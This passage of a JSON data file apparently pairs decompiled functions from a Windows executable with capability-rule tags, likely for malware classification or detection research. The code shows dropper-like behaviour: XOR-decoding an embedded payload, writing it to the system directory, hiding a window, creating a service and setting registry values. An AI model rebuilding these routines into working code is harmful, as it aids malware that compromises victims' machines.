*(extraout_ECX + -0x18) = uVar2;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        uVar2 = fcn.00403230();\n        if (!uVar5) {\n            if (uVar5) {\n                out(0xbd, uVar2);\n                return;\n            }\n        }\n        fcn.00403c80();\n        if (*0x42377c == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404620();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 528
    },
    "00404240": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404240(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4112d0, 0x423784, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00404b80": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404dc3) overlaps instruction at (ram,0x00404dc1)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404d35)\n// WARNING: Removing unreachable block (ram,0x00404c71)\n// WARNING: Removing unreachable block (ram,0x00404bdc)\n// WARNING: Removing unreachable block (ram,0x00404d10)\n// WARNING: Removing unreachable block (ram,0x00404d9b)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __fastcall fcn.00404b80(char *param_1, uint32_t param_2, int32_t *param_3)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    uint8_t uVar4;\n    char *in_EAX;\n    uint *puVar5;\n    uint32_t uVar6;\n    ushort uVar7;\n    uint16_t uVar8;\n    int32_t *piVar9;\n    char cVar11;\n    char **unaff_EBX;\n    int32_t iVar10;\n    uint **ppuVar12;\n    uint **unaff_EBP;\n    unkbyte6 *unaff_ESI;\n    unkbyte6 *pVar13;\n    char **unaff_EDI;\n    char *pcVar14;\n    char **ppcVar15;\n    uint16_t in_SS;\n    bool bVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    bool bVar18;\n    bool bVar19;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    int32_t in_stack_5f9dff5f;\n    uchar auStack38 [6];\n    uint uStack32;\n    int16_t iStack28;\n    int16_t iStack26;\n    uint uStack24;\n    uint *puStack4;\n    \n    while( true ) {\n        ppuVar12 = &puStack4;\n        puStack4 = unaff_EBP;\n        uStack24._2_2_ = in_EAX;\n        uStack24._0_2_ = param_2;\n        bVar19 = false;\n        uVar8 = uStack24 - 1U & param_1;\n        bVar17 = uVar8 < 0;\n        uVar4 = POPCOUNT(uVar8 & 0xff);\n        *param_3 = -0x45;\n        if ((bVar17) || (!bVar17)) {\n            *(param_3 + 1) = -0x3f;\n            ppcVar15 = unaff_EDI;\n        }\n        else {\n            *(in_EAX + -0x7ce92414) = in_ST0;\n            uVar4 = in_EAX + -1;\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            uVar4 = uVar4 + in_AF * '\\x06';\n            in_EAX = in_EAX + -1 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | in_AF * (0xf9 < uVar4)) * '`';\n            *param_3 = *param_3 + 0x42c6df84;\n            bVar19 = SCARRY4(param_1, in_EAX);\n            param_1 = param_1 + in_EAX;\n            bVar17 = param_1 < 0;\n            uVar4 = POPCOUNT(param_1 & 0xff);\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n            ppcVar15 = unaff_EBX;\n        }\n        bVar16 = (uVar4 & 1) == 0;\n        piVar9 = param_3;\n        pVar13 = unaff_ESI;\n        if (bVar19 == bVar17) {\n            uStack24._0_2_ = unaff_EDI;\n            uStack24._2_2_ = unaff_EDI >> 0x10;\n            if (bVar19 != bVar17) {\n                in_SS = ppcVar15;\n                pVar13 = unaff_ESI + -1;\n                pcVar14 = unaff_EDI | &puStack4;\n                unaff_EDI = pcVar14 + 1;\n                *pcVar14 = in_EAX;\n                piVar9 = param_3 & 0xffffff00;\n                uVar8 = in_EAX + (in_EAX >> 8) * 'y';\n                in_EAX = in_EAX & 0xffff0000 | uVar8;\n                bVar16 = (POPCOUNT(uVar8) & 1U) == 0;\n            }\n        }\n        *(piVar9 + 2) = -0x10;\n        if ((!bVar16) && (bVar16)) {\n            puVar5 = &uStack24;\n            cVar11 = '\\x1e';\n            do {\n                ppuVar12 = ppuVar12 + -1;\n                puVar5 = puVar5 + -1;\n                *puVar5 = *ppuVar12;\n                cVar11 = cVar11 + -1;\n            } while ('\\0' < cVar11);\n            puVar5 = in(0x78);\n            return puVar5;\n        }\n        *(piVar9 + 3) = -0x33;\n        unaff_EBP = &puStack4;\n        unaff_ESI = pVar13;\n        if ((bVar16) || (unaff_EBP = &puStack4,  !bVar16)) goto code_r0x00404c1a;\n        unaff_ESI = *unaff_EDI;\n        *unaff_EDI = pVar13;\n        unaff_EBP = &puStack4 - in_stack_5f9dff5f;\n        if (-1 < unaff_EBP) break;\n        param_2 = piVar9 & param_1;\n    }\n    if (-1 < unaff_ESI) {\n        swi(4);\n        uVar7 = param_1 >> 0x10;\n        bVar17 = SBORROW4(piVar9, *(unaff_ESI + 0x3b));\n        piVar9 = piVar9 - *(unaff_ESI + 0x3b);\n        bVar17 = bVar17 != false;\n        unaff_ESI = CONCAT22(iStack28, uStack32._2_2_);\n        piVar2 = piVar9;\n        goto code_r0x00404c77;\n    }\ncode_r0x00404c1a:\n    *(piVar9 + 1) = 'g';\n    uStack24._0_2_ = in_EAX;\n    *(piVar9 + 5) = -0x47;\n    uStack24._2_2_ = ((in_EAX >> 8 & 0xffff00) << 8) >> 0x10;\n    iStack28 = unaff_EBX;\n    iStack26 = unaff_EBX >> 0x10;\n    while( true ) {\n        iVar3 = iStack26;\n        in_EAX = CONCAT22(uStack24._2_2_, uStack24);\n        *(piVar9 + 6) = 'S';\n        uStack24._2_2_ = param_1;\n        iStack26 = iStack28;\n        uStack24._0_2_ = iVar3;\n        iStack28 = unaff_ESI >> 0x10;\n        uVar7 = param_1 >> 0x10;\n        bVar17 = SBORROW4(unaff_ESI | 0x561b, piVar9);\n        piVar2 = (unaff_ESI | 0x561b) - piVar9;\ncode_r0x00404c77:\n        uVar8 = uStack24._2_2_;\n        bVar18 = piVar2 < 0;\n        bVar16 = piVar2 == NULL;\n        bVar19 = (POPCOUNT(piVar2 & 0xff) & 1U) == 0;\n        iVar10 = CONCAT22(uStack24, iStack26);\n        *(piVar9 + 7) = '\\0';\n        if (!bVar18) {\n            uStack24._0_2_ = in_EAX;\n            uStack24._2_2_ = in_EAX >> 0x10;\n            if (bVar18) {\n                ppcVar15 = unaff_EDI + 1;\n                pcVar14 = unaff_ESI + 4;\n                *(unaff_EDI + 7) = in_ST0;\n                unaff_EDI = unaff_EDI + 5;\n                unaff_ESI = unaff_ESI + 5;\n                bVar17 = SBORROW1(*pcVar14, *ppcVar15);\n                cVar11 = *pcVar14 - *ppcVar15;\n                bVar18 = cVar11 < '\\0';\n                bVar16 = cVar11 == '\\0';\n                bVar19 = (POPCOUNT(cVar11) & 1U) == 0;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n        }\n        *(piVar9 + 2) = -9;\n        if ((!bVar18) && (bVar18)) {\n            ppcVar15 = unaff_EDI + 1;\n            pcVar14 = unaff_ESI + 4;\n            *(unaff_EDI + 7) = in_ST0;\n            unaff_EDI = unaff_EDI + 5;\n            unaff_ESI = unaff_ESI + 5;\n            bVar17 = SBORROW1(*pcVar14, *ppcVar15);\n            cVar11 = *pcVar14 - *ppcVar15;\n            bVar18 = cVar11 < '\\0';\n            bVar16 = cVar11 == '\\0';\n            bVar19 = (POPCOUNT(cVar11) & 1U) == 0;\n            in_ST0 = in_ST1;\n            in_ST1 = in_ST2;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = in_ST7;\n        }\n        *(piVar9 + 9) = -0x36;\n        if ((bVar16 || bVar17 != bVar18) || (param_1 = CONCAT22(uVar7, uVar8),  !bVar16 && bVar17 == bVar18)) break;\n        if (param_1 != NULL) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(piVar9 + 10) = '\\x1e';\n    if ((!bVar18) && (bVar18)) {\n        ppcVar15 = unaff_EDI + 1;\n        pcVar14 = unaff_ESI + 4;\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n        unaff_ESI = unaff_ESI + 5;\n        bVar17 = SBORROW1(*pcVar14, *ppcVar15);\n        cVar11 = *pcVar14 - *ppcVar15;\n        bVar18 = cVar11 < '\\0';\n        bVar19 = (POPCOUNT(cVar11) & 1U) == 0;\n        in_ST0 = in_ST1;\n    }\n    *(piVar9 + 0xb) = -0x16;\n    if ((bVar19) || (!bVar19)) {\n        *(piVar9 + 3) = -99;\n    }\n    else {\n        unaff_ESI = 0x34a96cf4;\n        pcVar14 = piVar9 + 1;\n        unaff_EBP = *0xc617b43a;\n        piVar9 = in_EAX + 1;\n        bVar17 = false;\n        in_EAX = pcVar14 | 0x9d;\n        bVar18 = (pcVar14 | 0x9d) < '\\0';\n    }\n    ppcVar15 = unaff_EDI;\n    if (bVar17 != bVar18) goto code_r0x00404d0f;\n    if (bVar17 == bVar18) goto code_r0x00404d0f;\n    out(0xc4, in_EAX);\n    while( true ) {\n        piVar9 = piVar9 & 0xffffff00 | piVar9 ^ uVar8;\n        ppcVar15 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n        cVar11 = iVar10 >> 8;\n        bVar17 = SBORROW1(cVar11, *in_EAX);\n        bVar18 = cVar11 - *in_EAX < '\\0';\n        auStack38._2_2_ = in_SS;\ncode_r0x00404d0f:\n        *(piVar9 + 0xd) = -0x13;\n        unaff_EDI = ppcVar15;\n        if (bVar17 == bVar18) {\n            uVar6 = piVar9 & 0xffff0000;\n            piVar9 = uVar6 | auStack38._2_2_;\n            if (bVar17 != bVar18) {\n                out(0xc4, in_EAX);\n                piVar9 = uVar6 | auStack38._2_2_ & 0xffffff00 | auStack38._2_2_ ^ uVar8;\n                unaff_EDI = ppcVar15 + 1;\n                *ppcVar15 = in_EAX;\n            }\n        }\n        *(piVar9 + 0xe) = -0x4d;\n        bVar17 = (POPCOUNT(piVar9 - 1U & uVar8 & 0xff) & 1U) == 0;\n        uVar6 = unaff_EBP[2];\n        *(uVar6 + 0xf) = 0x70;\n        if ((bVar17) || (!bVar17)) goto code_r0x00404d7a;\n        ppcVar15 = segment(in_SS, *0x10 + -0x1c);\n        in_EAX = *ppcVar15;\n        piVar9 = 0xb7bc9ea5;\n        if (!bVar17) break;\n        iVar10 = *unaff_ESI;\n    }\n    bVar17 = (POPCOUNT(&uStack24 & 0xff) & 1U) == 0;\n    uVar6 = in_EAX;\ncode_r0x00404d7a:\n    *(uVar6 + 0x10) = 0x77;\n    if ((!bVar17) && (bVar17)) {\n        puVar5 = &uStack32;\n        cVar11 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *unaff_EBP;\n            cVar11 = cVar11 + -1;\n        } while ('\\0' < cVar11);\n        puVar5 = in(0x78);\n        return puVar5;\n    }\n    *(uVar6 + 0x11) = 0x59;\n    bVar17 = (uVar8 >> 8 ^ iVar10) << 8 < 0;\n    *(uVar6 + 0x12) = 0xbc;\n    if ((bVar17) || (!bVar17)) {\n        *(uVar6 + 0x13) = 0xa9;\n    }\n    uVar1 = *(iVar10 + -0x3a);\n    iVar10 = *(CONCAT22(uVar7, uVar8) + 0x56535166);\n    bVar17 = -1 < (uVar6 | 0x561b) - piVar9;\n    *(unaff_ESI + 0x15) = '\\x12';\n    if ((bVar17) && (*((auStack38 ^ uVar1) + 6) = unaff_ESI + 1,  !bVar17)) {\n        *(unaff_EDI + 7) = in_ST0;\n    }\n    puVar5 = *(unaff_EBP + iVar10 + 0xc);\n    *puVar5 = 0x15;\n    return puVar5;\n}\n",
        "token_count": 3812
    },
    "null": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404e20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00404e48)\n\nvoid __cdecl fcn.00404e20(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404b80(&var_68h, &var_4h);\n    fcn.00404b00(&var_68h, var_4h, 0x411768, 0x12000);\n    *arg_8h = 0x411768;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 266
    },
    "00401f20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f20(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint16_t extraout_CX;\n    uint *puVar4;\n    uint *puVar5;\n    uint16_t unaff_SI;\n    bool bVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    iVar2 = fcn.00401ad0(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    bVar6 = (POPCOUNT(unaff_SI & extraout_CX & 0xff) & 1U) != 0;\n    *(iVar2 + 0x58) = var_4h;\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = &stack0xffffffe4;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    fcn.00401ad0(arg_8h, arg_ch, &var_8h, &var_4h);\n    return 1;\n}\n",
        "token_count": 349
    },
    "00402d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402d40(void)\n\n{\n    uint uVar1;\n    bool in_OF;\n    uint *unaff_retaddr;\n    uint in_stack_0000001c;\n    \n    if ((!in_OF) && (in_OF)) {\n        *unaff_retaddr = in_stack_0000001c;\n        return;\n    }\n    if (*0x423778 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x423778 = 1;\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00402f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040300c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402f10(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    s._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4112e8, &lpBuffer, arg_8h);\n    fcn.00404e20(&var_4h, &var_8h);\n    fcn.00403040(var_4h);\n    iVar1 = fcn.004049c0(&s, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00401dc0(&s, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 423
    },
    "00403440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403440(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "004041e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041fd) overlaps instruction at (ram,0x004041f8)\n// \n\nvoid __cdecl fcn.004041e0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EDI;\n    bool in_SF;\n    \n    if (((!in_SF) && (in_SF)) || (unaff_EDI = 0,  unaff_EBX = arg_ch,  arg_ch != 0)) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(unaff_EDI + arg_8h) = iVar1 % 0x1a + 'a';\n            unaff_EDI = unaff_EDI + 1;\n        } while (unaff_EDI < unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004042b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004042b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00404390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004043e9) overlaps instruction at (ram,0x004043e6)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404390(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_ch = 0;\n    if (0 < arg_14h) {\n        var_8h = 1;\n        do {\n            uVar1 = *(var_8h % arg_ch + arg_8h);\n            *(arg_18h + -1 + var_8h) = var_10h ^ *(var_ch + arg_10h) ^ *((var_8h + -1) % arg_ch + arg_8h);\n            *(var_8h + arg_18h) = var_10h ^ uVar1;\n            var_ch = var_ch + 1;\n            var_8h = var_8h + 2;\n        } while (var_ch < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00404ad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ae9) overlaps instruction at (ram,0x00404ae0)\n// \n\nint32_t fcn.00404ad0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    bool in_CF;\n    \n    if ((in_CF) || (!in_CF)) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0xff27e95e;\n        iVar1 = in_EAX + (in_CF == false) + 0x7ccf2bf5;\n    }\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 186
    },
    "004051b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004051b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401140(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "004044a0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004044a0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00404eb0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f14) overlaps instruction at (ram,0x00404f13)\n// \n// WARNING: Removing unreachable block (ram,0x00404f04)\n\nuint __cdecl fcn.00404eb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint32_t unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 246
    },
    "004045f0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004045f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41149c, 0x4114e0, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "00401d20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d83) overlaps instruction at (ram,0x00401d80)\n// \n\nvoid __cdecl fcn.00401d20(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint unaff_EDI;\n    bool bVar8;\n    uint uStack28;\n    ushort uStack24;\n    ushort uStack22;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    uVar3 = 0;\n    if (0 < arg_14h) {\n        while( true ) {\n            bVar8 = (arg_14h >> 8 & uVar3) != 6;\n            puVar7 = puVar6;\n            if ((bVar8) && (!bVar8)) {\n                puVar5 = &uStack24;\n                puVar7 = &uStack24;\n                uStack24 = SUB42(puVar6, 0);\n                uStack22 = puVar6 >> 0x10;\n                cVar2 = '\\x10';\n                do {\n                    puVar6 = puVar6 + -1;\n                    puVar5 = puVar5 + -1;\n                    *puVar5 = *puVar6;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n            }\n            uStack24 = unaff_EDI >> 0x10;\n            iVar1 = puVar7[5];\n            iVar4 = puVar7[-1];\n            arg_14h = puVar7[4];\n            *(iVar4 + arg_14h) = iVar1 ^ 0x21;\n            iVar4 = iVar4 + 1;\n            puVar7[-1] = iVar4;\n            if (iVar1 <= iVar4) break;\n            uVar3 = puVar7[-1];\n            puVar6 = puVar7;\n        }\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "00404b00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b2b) overlaps instruction at (ram,0x00404b27)\n// \n\nvoid __cdecl fcn.00404b00(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint8_t unaff_BL;\n    int32_t iVar2;\n    int32_t *unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    \ncode_r0x00404b01:\n    uVar1 = 0;\n    bVar3 = false;\n    bVar4 = arg_14h == 0;\n    iVar2 = arg_10h;\n    if (bVar4) {\n        return;\n    }\n    do {\n        if ((bVar3) || (!bVar3)) {\n            unaff_BL = *(uVar1 + iVar2);\n        }\n        else {\n            uVar1 = uVar1 - 1;\n            if (uVar1 != 0 && bVar4) goto code_r0x00404b01;\n            *unaff_EDI = iVar2 + 4;\n            iVar2 = -0x754713bc;\n        }\n        unaff_BL = unaff_BL ^ *(uVar1 % arg_ch + arg_8h);\n        if ((POPCOUNT(unaff_BL) & 1U) != 0) {\n            uVar1 = (uVar1 >> 8 & 0xffff00) << 8 | uVar1 & 0xffff;\n        }\n        *(uVar1 + iVar2) = unaff_BL;\n        uVar1 = uVar1 + 1;\n        bVar3 = uVar1 < arg_14h;\n        bVar4 = uVar1 == arg_14h;\n        if (!bVar3) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 423
    },
    "00403470": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t fcn.00403470(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar **ppuVar5;\n    uint *puVar6;\n    bool bVar7;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint *puStack300;\n    uchar var_110h;\n    uint var_10fh;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &stack0xfffffffc;\n    var_110h = 0;\n    var_4h = 0x104;\n    puVar6 = &var_10fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puStack300 = &var_8h;\n    uStack304 = 0x41174c;\n    uStack308 = 0x411724;\n    uStack312 = 0x80000002;\n    puStack316 = 0x4034c9;\n    uVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    bVar7 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 != 0) {\n        return 0;\n    }\n    if ((bVar7) && (!bVar7)) {\n        ppuVar5 = &puStack316;\n        cVar1 = '\\x1e';\n        do {\n            puVar4 = puVar4 + -1;\n            ppuVar5 = ppuVar5 + -1;\n            *ppuVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    puStack316 = 0x2e;\n    puStack16 = (*_sym.imp.MSVCRT.dll_strchr)(&var_110h);\n    if (puStack16 == NULL) {\n        return 0;\n    }\n    puStack316 = &var_110h;\n    *puStack16 = 0;\n    iVar3 = (*_sym.imp.MSVCRT.dll_atoi)();\n    if (iVar3 == 6) {\n        return 1;\n    }\n    return iVar3 == 7;\n}\n",
        "token_count": 611
    }
}